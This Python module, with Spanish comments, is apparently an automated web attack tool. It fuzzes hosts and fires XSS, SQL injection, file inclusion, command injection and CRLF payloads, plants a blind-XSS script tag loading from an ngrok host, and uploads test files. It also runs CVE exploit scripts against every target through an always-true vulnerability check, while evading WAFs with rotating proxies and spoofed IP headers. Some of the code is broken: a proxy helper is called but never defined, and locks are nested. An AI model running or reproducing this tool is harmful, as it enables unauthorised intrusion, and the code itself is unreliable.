# modules/deep_fuzz_xss.py
import sys
import os
import logging
import logging.handlers
import urllib.parse
import random
import json
import time
import queue
import asyncio
import aiohttp
import base64
import re
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from typing import List, Set, Dict, Optional
from pathlib import Path
import tool_wrapper
from tool_wrapper import run_tool
from database import Database
import psutil
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from config import BASE_DIR, BASE_WORDLIST_DIR, MAX_CONCURRENT_REQUESTS, REPORT_DIR, LOG_DIR

# Ajustar sys.path
sys.path.append(str(BASE_DIR))

log = logging.getLogger(__name__)

# Configurar logging rotativo
os.makedirs(LOG_DIR, exist_ok=True)
handler = logging.handlers.RotatingFileHandler(
    f"{LOG_DIR}/vuln_report.log", maxBytes=10*1024*1024, backupCount=5
)
handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
log.addHandler(handler)
log.setLevel(logging.INFO)

class DeepFuzzXSSModule:
    def __init__(self):
        self.db = Database()
        self.program_name: Optional[str] = None
        self.ngrok_url: str = self._get_ngrok_url()
        self.base_dir = Path(BASE_WORDLIST_DIR)
        self.xss_payloads: Set[str] = self._load_xss_payloads()
        self.crlf_payloads: Set[str] = self._load_crlf_payloads()
        self.fuzz_params: List[str] = self._load_fuzz_params()
        self.user_agents: List[str] = self._load_user_agents()
        self.proxies: List[str] = self._load_proxies()
        self.max_workers: int = min(10, psutil.cpu_count(logical=True) * 2)
        self.request_queue = queue.Queue(maxsize=MAX_CONCURRENT_REQUESTS)
        self.cache_file: str = str(BASE_DIR / "output" / "xss_cache.json")
        self.cve_cache_file: str = str(BASE_DIR / "output" / "cve_cache.json")
        self.cache: Dict = self._load_cache(self.cache_file)
        self.cve_cache: Dict = self._load_cache(self.cve_cache_file)
        self.session_headers: Dict = self._initialize_headers()
        self.wordlists: Dict = self._load_wordlists()
        self.cve_scripts: List[Dict] = self._load_cve_scripts()
        self.nvd_api_url: str = "https://services.nvd.nist.gov/rest/json/cves/2.0"
        self.selenium_driver: Optional[webdriver.Chrome] = self._init_selenium()
        self.semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
        self.tools = ['ffuf', 'gobuster', 'dirsearch', 'arjun', 'wfuzz']

    def _get_ngrok_url(self) -> str:
        """Obtiene la URL de ngrok dinámicamente."""
        try:
            with open(BASE_DIR / "modules" / "xss_server" / "public" / "payload.js", 'r') as f:
                content = f.read()
                match = re.search(r'https://[^"]+', content)
                return match.group(0) if match else "https://42a4-189-174-167-213.ngrok-free.app"
        except Exception as e:
            log.error(f"Error obteniendo URL de ngrok: {e}")
            return "https://42a4-189-174-167-213.ngrok-free.app"

    def _load_xss_payloads(self) -> Set[str]:
        """Carga payloads XSS desde múltiples fuentes."""
        payloads = set([f"<script src='{self.ngrok_url}/payload.js'></script>"])
        sources = [
            self.base_dir / "fuzzdb" / "attack" / "xss",
            self.base_dir / "SecLists" / "Fuzzing" / "XSS" / "human-friendly",
            self.base_dir / "SecLists" / "Fuzzing" / "XSS" / "robot-friendly",
            self.base_dir / "SecLists" / "Fuzzing" / "Polyglots",
            self.base_dir / "PayloadsAllTheThings" / "XSS Injection",
            BASE_DIR / "xss_payloads.txt"
        ]
        for source in sources:
            if source.is_dir():
                for file in source.glob("*.txt"):
                    try:
                        with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                            for line in f:
                                payload = line.strip()
                                if payload and not payload.startswith('#'):
                                    payloads.add(payload)
                                    payloads.add(urllib.parse.quote(payload))
                                    payloads.add(urllib.parse.quote_plus(payload))
                                    payloads.add(f"UTF-7:+ADw-script+AD4-{urllib.parse.quote(payload)}+ADw-/script+AD4-")
                                    payloads.add(f"data:text/html;base64,{base64.b64encode(payload.encode()).decode()}")
                    except Exception as e:
                        log.error(f"Error cargando {file}: {e}")
            elif source.is_file():
                try:
                    with open(source, 'r', encoding='utf-8', errors='ignore') as f:
                        for line in f:
                            payload = line.strip()
                            if payload and not payload.startswith('#'):
                                payloads.add(payload)
                                payloads.add(urllib.parse.quote(payload))
                                payloads.add(urllib.parse.quote_plus(payload))
                                payloads.add(f"UTF-7:+ADw-script+AD4-{urllib.parse.quote(payload)}+ADw-/script+AD4-")
                                payloads.add(f"data:text/html;base64,{base64.b64encode(payload.encode()).decode()}")
                except Exception as e:
                    log.error(f"Error cargando {source}: {e}")
        log.info(f"Cargados {len(payloads)} payloads XSS")
        return payloads

    def _load_crlf_payloads(self) -> Set[str]:
        """Carga payloads CRLF."""
        payloads = set()
        crlf_file = self.base_dir / "PayloadsAllTheThings" / "CRLF Injection" / "Files" / "crlfinjection.txt"
        if crlf_file.exists():
            try:
                with open(crlf_file, 'r', encoding='utf-8') as f:
                    payloads.update(line.strip() for line in f if line.strip())
            except Exception as e:
                log.error(f"Error cargando CRLF payloads: {e}")
        return payloads

    def _load_fuzz_params(self) -> List[str]:
        """Carga parámetros para fuzzing."""
        params = set(['id', 'q', 'search', 'name', 'value', 'page', 'user', 'token', 'key', 'query', 'callback'])
        sources = [
            self.base_dir / "fuzzdb" / "wordlists-misc" / "params.txt",
            self.base_dir / "SecLists" / "Discovery" / "Variables" / "params.txt"
        ]
        for source in sources:
            if source.exists():
                try:
                    with open(source, 'r', encoding='utf-8') as f:
                        params.update(line.strip() for line in f if line.strip())
                except Exception as e:
                    log.error(f"Error cargando parámetros de {source}: {e}")
        return list(params)

    def _load_user_agents(self) -> List[str]:
        """Carga user-agents para rotación."""
        user_agents = []
        sources = [
            self.base_dir / "fuzzdb" / "wordlists-misc" / "user-agents.txt",
            self.base_dir / "SecLists" / "Fuzzing" / "User-Agents" / "user-agents.txt",
            BASE_DIR / "user_agents.txt"
        ]
        for source in sources:
            if source.exists():
                try:
                    with open(source, 'r', encoding='utf-8') as f:
                        user_agents.extend(line.strip() for line in f if line.strip())
                except Exception as e:
                    log.error(f"Error cargando user-agents de {source}: {e}")
        return user_agents or ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36']

    def _load_proxies(self) -> List[str]:
        """Carga proxies para evasión WAF."""
        proxies = []
        source = BASE_DIR / "proxies.txt"
        if source.exists():
            try:
                with open(source, 'r', encoding='utf-8') as f:
                    proxies = [line.strip() for line in f if line.strip()]
            except Exception as e:
                log.error(f"Error cargando proxies: {e}")
        return proxies

    def _load_wordlists(self) -> Dict:
        """Carga wordlists para fuzzing."""
        wordlists = {
            'dirs': [
                self.base_dir / "SecLists" / "Discovery" / "Web-Content" / "common.txt",
                self.base_dir / "SecLists" / "Discovery" / "Web-Content" / "big.txt",
                self.base_dir / "fuzzdb" / "discovery" / "predictable-resource-locations" / "dirs.txt",
                self.base_dir / "SecLists" / "Discovery" / "Web-Content" / "raft-large-directories.txt"
            ],
            'files': [
                self.base_dir / "fuzzdb" / "discovery" / "predictable-resource-locations" / "files.txt",
                self.base_dir / "SecLists" / "Discovery" / "Web-Content" / "raft-large-files.txt",
                self.base_dir / "SecLists" / "Payloads" / "File-Names"
            ],
            'extensions': [
                self.base_dir / "SecLists" / "Fuzzing" / "extensions-most-common.fuzz.txt",
                self.base_dir / "SecLists" / "Fuzzing" / "file-extensions.txt"
            ],
            'sqli': [
                self.base_dir / "SecLists" / "Fuzzing" / "SQLi",
                self.base_dir / "PayloadsAllTheThings" / "SQL Injection",
                self.base_dir / "SecLists" / "Fuzzing" / "Databases"
            ],
            'lfi': [
                self.base_dir / "SecLists" / "Fuzzing" / "LFI"
            ],
            'cmd_injection': [
                self.base_dir / "SecLists" / "Fuzzing" / "command-injection-commix.txt",
                self.base_dir / "PayloadsAllTheThings" / "Command Injection"
            ],
            'backdoors': [
                self.base_dir / "SecLists" / "Web-Shells" / "backdoor_list.txt"
            ],
            'flash': [
                self.base_dir / "SecLists" / "Payloads" / "Flash" / "xssproject.swf"
            ],
            'antivirus': [
                self.base_dir / "SecLists" / "Payloads" / "Anti-Virus" / "eicar-com.txt"
            ]
        }
        return {k: [p for p in v if p.exists() or (p.is_dir() and any(p.glob("*.txt")))] for k, v in wordlists.items()}

    def _load_cve_scripts(self) -> List[Dict]:
        """Carga scripts CVE en Python."""
        cve_dir = self.base_dir / "PayloadsAllTheThings" / "CVE Exploits"
        scripts = []
        if cve_dir.exists():
            for file in cve_dir.glob("*.py"):
                cve_id = re.search(r'CVE-\d{4}-\d+', file.stem)
                scripts.append({
                    'name': file.name,
                    'path': str(file),
                    'cve_id': cve_id.group(0) if cve_id else None
                })
        return scripts

    def _init_selenium(self) -> Optional[webdriver.Chrome]:
        """Inicializa Selenium para DOM XSS."""
        try:
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--no-sandbox')
            return webdriver.Chrome(options=chrome_options)
        except Exception as e:
            log.error(f"Error inicializando Selenium: {e}")
            return None

    def _load_cache(self, cache_file: str) -> Dict:
        """Carga caché de resultados."""
        try:
            if os.path.exists(cache_file):
                with open(cache_file, 'r') as f:
                    return json.load(f)
        except Exception as e:
            log.error(f"Error cargando caché {cache_file}: {e}")
        return {}

    def _save_cache(self, cache_file: str, data: Dict):
        """Guarda caché de resultados."""
        try:
            os.makedirs(os.path.dirname(cache_file), exist_ok=True)
            with open(cache_file, 'w') as f:
                json.dump(data, f)
        except Exception as e:
            log.error(f"Error guardando caché {cache_file}: {e}")

    def _initialize_headers(self) -> Dict:
        """Inicializa headers para solicitudes."""
        return {
            'User-Agent': self._get_random_user_agent(),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://www.myntra.com/',
            'Origin': 'https://www.myntra.com',
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Requested-With': 'XMLHttpRequest'
        }

    def _validate_tools(self):
        """Valida la existencia de herramientas requeridas."""
        import shutil
        for tool in self.tools:
            if not shutil.which(tool):
                log.error(f"Herramienta {tool} no encontrada. Instálala antes de continuar.")
                raise FileNotFoundError(f"Herramienta {tool} no encontrada")

    async def run(self, data: tuple) -> tuple:
        """Ejecuta el módulo de fuzzing y XSS."""
        self._validate_tools()
        live_hosts, endpoints = data if isinstance(data, tuple) else ([], [])
        self.program_name = "Valve"
        log.info(f"Iniciando Fuzzing y XSS en {len(live_hosts)} hosts con {len(endpoints)} endpoints...")

        async with aiohttp.ClientSession() as session:
            tasks = []
            for host in live_hosts:
                self.request_queue.put(host)
                tasks.append(self._process_host(session, host, endpoints))
            new_endpoints = await asyncio.gather(*tasks, return_exceptions=True)
            endpoints.extend([ep for sublist in new_endpoints if isinstance(sublist, list) for ep in sublist])

        self._save_cache(self.cache_file, self.cache)
        self._save_cache(self.cve_cache_file, self.cve_cache)
        await self._generate_report()
        if self.selenium_driver:
            self.selenium_driver.quit()
        self.db.close()
        return live_hosts, endpoints

    async def _process_host(self, session: aiohttp.ClientSession, host: str, endpoints: list) -> List[str]:
        """Procesa un host con fuzzing y análisis."""
        if not self.request_queue.get():
            return []
        new_endpoints = await self.perform_fuzzing(host)
        relevant_endpoints = [ep for ep in endpoints + new_endpoints if host in ep]
        await self.perform_xss_analysis(session, host, relevant_endpoints)
        await self.perform_sqli_analysis(session, host, relevant_endpoints)
        await self.perform_lfi_analysis(session, host, relevant_endpoints)
        await self.perform_cmd_injection_analysis(session, host, relevant_endpoints)
        await self.perform_crlf_analysis(session, host, relevant_endpoints)
        await self.perform_upload_analysis(session, host, relevant_endpoints)
        await self.detect_backdoors(session, host)
        await self.test_cve_exploits(host)
        return new_endpoints

    async def perform_fuzzing(self, host: str) -> List[str]:
        """Realiza fuzzing en el host."""
        log.info(f"Realizando fuzzing en {host}...")
        cache_key = f"fuzz_{host}"
        if cache_key in self.cache:
            return self.cache[cache_key]

        new_endpoints = set()
        tools = []
        for wordlist in self.wordlists['dirs'] + self.wordlists['files']:
            if wordlist.is_dir():
                for file in wordlist.glob("*.txt"):
                    tools.extend(self._get_fuzz_tools(host, file))
            else:
                tools.extend(self._get_fuzz_tools(host, wordlist))
        tools.append({
            'tool': 'arjun',
            'command': ["arjun", "-u", f"https://{host}", "--stable", "-o", f"output/{host}_arjun.json"],
            'output_file': f"output/{host}_arjun.json",
            'output_parser': self._parse_arjun_output
        })

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(self._run_fuzz_tool, tool) for tool in tools]
            for future in futures:
                try:
                    new_endpoints.update(future.result())
                except Exception as e:
                    log.error(f"Error en fuzzing: {e}")

        param_endpoints = set()
        for endpoint in new_endpoints:
            param_endpoints.update(self._fuzz_parameters(endpoint))

        new_endpoints.update(param_endpoints)
        self.cache[cache_key] = list(new_endpoints)
        return list(new_endpoints)

    def _get_fuzz_tools(self, host: str, wordlist: Path) -> List[Dict]:
        """Genera configuraciones para herramientas de fuzzing."""
        return [
            {
                'tool': 'ffuf',
                'command': ["ffuf", "-u", f"https://{host}/FUZZ", "-w", str(wordlist), "-e", ",".join(self._load_extensions()), "-mc", "200,301,302", "-s", "-o", f"output/{host}_ffuf_{wordlist.name}.json"],
                'output_file': f"output/{host}_ffuf_{wordlist.name}.json",
                'output_parser': self._parse_ffuf_output
            },
            {
                'tool': 'gobuster',
                'command': ["gobuster", "dir", "-u", f"https://{host}", "-w", str(wordlist), "-x", ",".join(self._load_extensions()), "-q", "-o", f"output/{host}_gobuster_{wordlist.name}.txt"],
                'output_file': f"output/{host}_gobuster_{wordlist.name}.txt",
                'output_parser': self._parse_gobuster_output
            },
            {
                'tool': 'dirsearch',
                'command': ["dirsearch", "-u", f"https://{host}", "-e", ",".join(self._load_extensions()), "-w", str(wordlist), "--simple-report", f"output/{host}_dirsearch_{wordlist.name}.txt"],
                'output_file': f"output/{host}_dirsearch_{wordlist.name}.txt",
                'output_parser': self._parse_dirsearch_output
            },
            {
                'tool': 'wfuzz',
                'command': ["wfuzz", "-u", f"https://{host}/FUZZ", "-w", str(wordlist), "--hc", "404", "-o", f"output/{host}_wfuzz_{wordlist.name}.json"],
                'output_file': f"output/{host}_wfuzz_{wordlist.name}.json",
                'output_parser': self._parse_wfuzz_output
            }
        ]

    def _load_extensions(self) -> List[str]:
        """Carga extensiones para fuzzing."""
        extensions = set()
        for ext_file in self.wordlists['extensions']:
            try:
                with open(ext_file, 'r', encoding='utf-8') as f:
                    extensions.update(line.strip().lstrip('.') for line in f if line.strip())
            except Exception as e:
                log.error(f"Error cargando extensiones de {ext_file}: {e}")
        return list(extensions)

    def _run_fuzz_tool(self, tool_config: Dict) -> Set[str]:
        """Ejecuta una herramienta de fuzzing."""
        command = tool_config['command']
        output_file = tool_config['output_file']
        output_parser = tool_config['output_parser']
        try:
            result = run_tool(command, output_file=output_file, timeout=300)
            if result["returncode"] == 0:
                return output_parser(output_file)
            log.warning(f"Fallo en {command[0]}: {result['stderr']}")
        except Exception as e:
            log.error(f"Error ejecutando {command[0]}: {e}")
        return set()

    def _parse_ffuf_output(self, output_file: str) -> Set[str]:
        endpoints = set()
        try:
            with open(output_file, 'r') as f:
                data = json.load(f)
            for item in data.get('results', []):
                endpoints.add(item['url'])
        except Exception as e:
            log.error(f"Error parseando ffuf {output_file}: {e}")
        return endpoints

    def _parse_gobuster_output(self, output_file: str) -> Set[str]:
        endpoints = set()
        try:
            with open(output_file, 'r') as f:
                for line in f:
                    if line.strip():
                        endpoints.add(line.strip())
        except Exception as e:
            log.error(f"Error parseando gobuster {output_file}: {e}")
        return endpoints

    def _parse_dirsearch_output(self, output_file: str) -> Set[str]:
        endpoints = set()
        try:
            with open(output_file, 'r') as f:
                for line in f:
                    if line.strip():
                        endpoints.add(line.strip())
        except Exception as e:
            log.error(f"Error parseando dirsearch {output_file}: {e}")
        return endpoints

    def _parse_wfuzz_output(self, output_file: str) -> Set[str]:
        endpoints = set()
        try:
            with open(output_file, 'r') as f:
                data = json.load(f)
            for item in data.get('results', []):
                if item.get('code') in [200, 301, 302]:
                    endpoints.add(item['url'])
        except Exception as e:
            log.error(f"Error parseando wfuzz {output_file}: {e}")
        return endpoints

    def _parse_arjun_output(self, output_file: str) -> Set[str]:
        endpoints = set()
        try:
            with open(output_file, 'r') as f:
                data = json.load(f)
            for param in data.get('parameters', []):
                endpoints.add(f"?{param}=FUZZ")
        except Exception as e:
            log.error(f"Error parseando arjun {output_file}: {e}")
        return endpoints

    def _fuzz_parameters(self, endpoint: str) -> Set[str]:
        """Genera endpoints con parámetros dinámicos."""
        parsed = urllib.parse.urlparse(endpoint)
        params = set()
        for param in self.fuzz_params:
            query = urllib.parse.urlencode({param: 'FUZZ'})
            new_url = urllib.parse.urlunparse(parsed._replace(query=query))
            params.add(new_url)
        return params

    async def perform_xss_analysis(self, session: aiohttp.ClientSession, host: str, endpoints: List[str]):
        """Analiza endpoints para vulnerabilidades XSS."""
        log.info(f"Analizando XSS en {host} con {len(endpoints)} endpoints...")
        async with self.semaphore:
            tasks = [self._test_xss(session, host, endpoint) for endpoint in endpoints]
            await asyncio.gather(*tasks, return_exceptions=True)

    async def perform_sqli_analysis(self, session: aiohttp.ClientSession, host: str, endpoints: List[str]):
        """Analiza endpoints para vulnerabilidades SQLi."""
        log.info(f"Analizando SQLi en {host}...")
        payloads = set()
        for sqli_dir in self.wordlists['sqli']:
            if sqli_dir.is_dir():
                for file in sqli_dir.glob("*.txt"):
                    try:
                        with open(file, 'r', encoding='utf-8') as f:
                            payloads.update(line.strip() for line in f if line.strip())
                    except Exception as e:
                        log.error(f"Error cargando payloads SQLi de {file}: {e}")
        async with self.semaphore:
            for endpoint in endpoints:
                await self._test_injection(session, host, endpoint, payloads, "SQLi")

    async def perform_lfi_analysis(self, session: aiohttp.ClientSession, host: str, endpoints: List[str]):
        """Analiza endpoints para vulnerabilidades LFI."""
        log.info(f"Analizando LFI en {host}...")
        payloads = set()
        for lfi_dir in self.wordlists['lfi']:
            for file in lfi_dir.glob("*.txt"):
                try:
                    with open(file, 'r', encoding='utf-8') as f:
                        payloads.update(line.strip() for line in f if line.strip())
                except Exception as e:
                    log.error(f"Error cargando payloads LFI de {file}: {e}")
        async with self.semaphore:
            for endpoint in endpoints:
                await self._test_injection(session, host, endpoint, payloads, "LFI")

    async def perform_cmd_injection_analysis(self, session: aiohttp.ClientSession, host: str, endpoints: List[str]):
        """Analiza endpoints para inyección de comandos."""
        log.info(f"Analizando inyección de comandos en {host}...")
        payloads = set()
        for cmd_dir in self.wordlists['cmd_injection']:
            if cmd_dir.is_dir():
                for file in cmd_dir.glob("*.txt"):
                    try:
                        with open(file, 'r', encoding='utf-8') as f:
                            payloads.update(line.strip() for line in f if line.strip())
                    except Exception as e:
                        log.error(f"Error cargando payloads de comandos de {file}: {e}")
            else:
                try:
                    with open(cmd_dir, 'r', encoding='utf-8') as f:
                        payloads.update(line.strip() for line in f if line.strip())
                except Exception as e:
                    log.error(f"Error cargando payloads de comandos de {cmd_dir}: {e}")
        async with self.semaphore:
            for endpoint in endpoints:
                await self._test_injection(session, host, endpoint, payloads, "Command Injection")

    async def perform_crlf_analysis(self, session: aiohttp.ClientSession, host: str, endpoints: List[str]):
        """Analiza endpoints para inyección CRLF."""
        log.info(f"Analizando CRLF en {host}...")
        async with self.semaphore:
            for endpoint in endpoints:
                await self._test_injection(session, host, endpoint, self.crlf_payloads, "CRLF Injection")

    async def perform_upload_analysis(self, session: aiohttp.ClientSession, host: str, endpoints: List[str]):
        """Prueba carga de archivos maliciosos."""
        log.info(f"Analizando uploads en {host}...")
        files = []
        for file_type in ['flash', 'antivirus']:
            for file_path in self.wordlists[file_type]:
                files.append(file_path)
        async with self.semaphore:
            for endpoint in endpoints:
                if any(keyword in endpoint.lower() for keyword in ['upload', 'file', 'attachment']):
                    for file_path in files:
                        await self._test_file_upload(session, host, endpoint, file_path)

    async def detect_backdoors(self, session: aiohttp.ClientSession, host: str):
        """Detecta backdoors en el host."""
        log.info(f"Buscando backdoors en {host}...")
        for backdoor_list in self.wordlists['backdoors']:
            command = ["ffuf", "-u", f"https://{host}/FUZZ", "-w", str(backdoor_list), "-mc", "200", "-s", "-o", f"output/{host}_backdoors.json"]
            try:
                result = run_tool(command, output_file=f"output/{host}_backdoors.json", timeout=300)
                if result["returncode"] == 0:
                    with open(f"output/{host}_backdoors.json", 'r') as f:
                        data = json.load(f)
                    for item in data.get('results', []):
                        url = item['url']
                        await self._save_finding(host, url, "Posible backdoor encontrada", "Backdoor", 9.0)
            except Exception as e:
                log.error(f"Error buscando backdoors: {e}")

    async def test_cve_exploits(self, host: str):
        """Ejecuta scripts CVE contra el host."""
        log.info(f"Probando exploits CVE en {host}...")
        cache_key = f"cve_{host}"
        if cache_key in self.cve_cache:
            return
        for script in self.cve_scripts:
            cve_id = script['cve_id']
            if not cve_id:
                continue
            try:
                nvd_data = await self._query_nvd(cve_id)
                if nvd_data and self._is_host_vulnerable(host, nvd_data):
                    result = run_tool(
                        ["python3", script['path'], "--url", f"https://{host}"],
                        output_file=f"output/{host}_{script['name']}.txt",
                        timeout=60
                    )
                    if "vulnerable" in result["stdout"].lower():
                        description = f"Host vulnerable a {cve_id}: {result['stdout']}"
                        await self._save_finding(host, f"https://{host}", description, "CVE", 9.5, cve=cve_id)
            except Exception as e:
                log.error(f"Error ejecutando {script['name']}: {e}")
        self.cve_cache[cache_key] = True

    async def _query_nvd(self, cve_id: str) -> Optional[Dict]:
        """Consulta la API de NVD para detalles del CVE."""
        async with self.semaphore:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(f"{self.nvd_api_url}?cveId={cve_id}", timeout=5) as response:
                        if response.status == 200:
                            return await response.json()
            except Exception as e:
                log.error(f"Error consultando NVD para {cve_id}: {e}")
            return None

    def _is_host_vulnerable(self, host: str, nvd_data: Dict) -> bool:
        """Verifica si el host es vulnerable según datos NVD."""
        # Placeholder: Correlacionar con banners de ReconModule
        return True

    async def _test_xss(self, session: aiohttp.ClientSession, host: str, endpoint: str):
        """Prueba un endpoint para XSS."""
        cache_key = f"xss_{endpoint}"
        if cache_key in self.cache:
            return
        async with self.semaphore:
            parsed = urllib.parse.urlparse(endpoint)
            query_params = urllib.parse.parse_qs(parsed.query)
            techniques = [
                self._test_reflected_xss,
                self._test_dom_xss,
                self._test_post_xss,
                self._test_header_injection,
                self._test_jsonp_xss,
                self._test_selenium_xss
            ]
            for technique in techniques:
                for param in query_params:
                    for payload in random.sample(list(self.xss_payloads), min(50, len(self.xss_payloads))):
                        await technique(session, host, endpoint, param, payload)
                        await asyncio.sleep(random.uniform(0.2, 1.0))
            self.cache[cache_key] = True

    async def _test_injection(self, session: aiohttp.ClientSession, host: str, endpoint: str, payloads: Set[str], injection_type: str):
        """Prueba inyecciones genéricas."""
        async with self.semaphore:
            parsed = urllib.parse.urlparse(endpoint)
            query_params = urllib.parse.parse_qs(parsed.query)
            for param in query_params:
                for payload in random.sample(list(payloads), min(30, len(payloads))):
                    new_query = urllib.parse.parse_qs(parsed.query)
                    new_query[param] = payload
                    new_url = parsed._replace(query=urllib.parse.urlencode(new_query, doseq=True)).geturl()
                    headers = self.session_headers.copy()
                    await self._execute_request(session, host, new_url, payload, headers, injection_type)
                    await asyncio.sleep(random.uniform(0.2, 1.0))

    async def _test_file_upload(self, session: aiohttp.ClientSession, host: str, endpoint: str, file_path: Path):
        """Prueba carga de archivos."""
        async with self.semaphore:
            try:
                data = aiohttp.FormData()
                with open(file_path, 'rb') as f:
                    data.add_field('file', f, filename=file_path.name, content_type='application/octet-stream')
                headers = self.session_headers.copy()
                async with session.post(endpoint, data=data, headers=headers, timeout=10) as response:
                    text = await response.text()
                    if "success" in text.lower() or response.status == 200:
                        description = f"Posible upload exitoso de {file_path.name} en {endpoint}"
                        await self._save_finding(host, endpoint, description, "File Upload", 7.0)
            except Exception as e:
                log.error(f"Error probando upload en {endpoint}: {e}")

    async def _test_reflected_xss(self, session: aiohttp.ClientSession, host: str, endpoint: str, param: str, payload: str):
        parsed = urllib.parse.urlparse(endpoint)
        new_query = urllib.parse.parse_qs(parsed.query)
        new_query[param] = payload
        new_url = parsed._replace(query=urllib.parse.urlencode(new_query, doseq=True)).geturl()
        headers = self.session_headers.copy()
        await self._execute_request(session, host, new_url, payload, headers, "XSS")

    async def _test_dom_xss(self, session: aiohttp.ClientSession, host: str, endpoint: str, param: str, payload: str):
        parsed = urllib.parse.urlparse(endpoint)
        fragment = f"{param}={urllib.parse.quote(payload)}"
        new_url = parsed._replace(fragment=fragment).geturl()
        headers = self.session_headers.copy()
        await self._execute_request(session, host, new_url, payload, headers, "XSS")

    async def _test_post_xss(self, session: aiohttp.ClientSession, host: str, endpoint: str, param: str, payload: str):
        data = {param: payload}
        headers = self.session_headers.copy()
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        await self._execute_request(session, host, endpoint, payload, headers, "XSS", method='POST', data=data)

    async def _test_header_injection(self, session: aiohttp.ClientSession, host: str, endpoint: str, param: str, payload: str):
        headers = self.session_headers.copy()
        headers['X-Custom-Header'] = payload
        await self._execute_request(session, host, endpoint, payload, headers, "XSS")

    async def _test_jsonp_xss(self, session: aiohttp.ClientSession, host: str, endpoint: str, param: str, payload: str):
        parsed = urllib.parse.urlparse(endpoint)
        new_query = urllib.parse.parse_qs(parsed.query)
        new_query['callback'] = payload
        new_url = parsed._replace(query=urllib.parse.urlencode(new_query, doseq=True)).geturl()
        headers = self.session_headers.copy()
        await self._execute_request(session, host, new_url, payload, headers, "XSS")

    async def _test_selenium_xss(self, session: aiohttp.ClientSession, host: str, endpoint: str, param: str, payload: str):
        if not self.selenium_driver:
            return
        async with self.semaphore:
            try:
                parsed = urllib.parse.urlparse(endpoint)
                new_query = urllib.parse.parse_qs(parsed.query)
                new_query[param] = payload
                new_url = parsed._replace(query=urllib.parse.urlencode(new_query, doseq=True)).geturl()
                self.selenium_driver.get(new_url)
                if "alert" in self.selenium_driver.page_source.lower():
                    await self._save_finding(host, new_url, f"Posible DOM XSS en {new_url} con payload: {payload}", "XSS", 7.5)
            except Exception as e:
                log.error(f"Error en Selenium XSS para {endpoint}: {e}")

    async def _execute_request(self, session: aiohttp.ClientSession, host: str, url: str, payload: str, headers: Dict, injection_type: str, method: str = 'GET', data: Optional[Dict] = None):
        """Ejecuta una solicitud HTTP y verifica la respuesta."""
        async with self.semaphore:
            try:
                proxy = self._get_random_proxy()
                kwargs = {'headers': headers, 'proxy': proxy, 'timeout': aiohttp.ClientTimeout(total=10)}
                if method == 'POST' and data:
                    kwargs['data'] = urllib.parse.urlencode(data)
                async with session.request(method, url, **kwargs) as response:
                    text = await response.text()
                    if injection_type == "XSS":
                        if payload in text or urllib.parse.unquote(payload) in text:
                            await self._save_finding(host, url, f"Posible XSS en {url} con payload: {payload}", "XSS", 7.5)
                    elif injection_type in ["SQLi", "LFI", "Command Injection", "CRLF Injection"]:
                        error_patterns = {
                            "SQLi": ["sql syntax", "mysql_fetch", "unexpected token"],
                            "LFI": ["file not found", "/etc/passwd"],
                            "Command Injection": ["/bin/sh", "bash: command not found", "root:x"],
                            "CRLF Injection": ["set-cookie", "crlf=injection"]
                        }
                        if any(pattern in text.lower() for pattern in error_patterns.get(injection_type, [])):
                            severity = {"SQLi": 8.0, "LFI": 8.5, "Command Injection": 9.0, "CRLF Injection": 6.5}
                            await self._save_finding(host, url, f"Posible {injection_type} en {url} con payload: {payload}", injection_type, severity[injection_type])
            except asyncio.TimeoutError:
                log.warning(f"Timeout en {url} con {injection_type}")
            except Exception as e:
                log.error(f"Error ejecutando solicitud en {url} ({injection_type}): {e}")

    async def _save_finding(self, host: str, url: str, description: str, vuln_type: str, risk_score: float, cve: Optional[str] = None):
        """Guarda hallazgo en la base de datos y log."""
        try:
            finding_id = await self.db.insert_finding_async(self.program_name, host, description, vuln_type, risk_score, cve)
            log.info(f"Hallazgo guardado: ID={finding_id}, Host={host}, URL={url}, Tipo={vuln_type}, Score={risk_score}")
        except Exception as e:
            log.error(f"Error guardando hallazgo: {e}")

    async def _generate_report(self):
        """Genera reportes en JSON y Markdown."""
        try:
            findings = await self.db.fetch_all_async(
                "SELECT * FROM findings WHERE program_name = ? ORDER BY risk_score DESC",
                (self.program_name,)
            )
            if not findings:
                log.info("No se encontraron hallazgos para generar reporte")
                return

            report_data = {
                "program_name": self.program_name,
                "generated_at": datetime.utcnow().isoformat(),
                "findings": findings
            }
            os.makedirs(REPORT_DIR, exist_ok=True)

            # Reporte JSON
            json_report_path = f"{REPORT_DIR}/{self.program_name}_report_{int(time.time())}.json"
            with open(json_report_path, 'w') as f:
                json.dump(report_data, f, indent=2)
            await self.db.insert_report_async(self.program_name, "JSON", json_report_path)

            # Reporte Markdown
            md_report_path = f"{REPORT_DIR}/{self.program_name}_report_{int(time.time())}.md"
            with open(md_report_path, 'w') as f:
                f.write(f"# Reporte de Vulnerabilidades - {self.program_name}\n\n")
                f.write(f"Generado el: {report_data['generated_at']}\n\n")
                for finding in findings:
                    f.write(f"## {finding['vuln_type']} - Score: {finding['risk_score']}\n")
                    f.write(f"- **Host**: {finding['target']}\n")
                    f.write(f"- **Descripción**: {finding['description']}\n")
                    f.write(f"- **CVE**: {finding['cve'] or 'N/A'}\n")
                    f.write(f"- **Estado**: {finding['status']}\n")
                    f.write(f"- **Timestamp**: {finding['timestamp']}\n\n")
            await self.db.insert_report_async(self.program_name, "MARKDOWN", md_report_path)

            log.info(f"Reportes generados: {json_report_path}, {md_report_path}")
        except Exception as e:
            log.error(f"Error generando reporte: {e}")

    def _get_random_user_agent(self) -> str:
        """Obtiene un user-agent aleatorio."""
        return random.choice(self.user_agents)

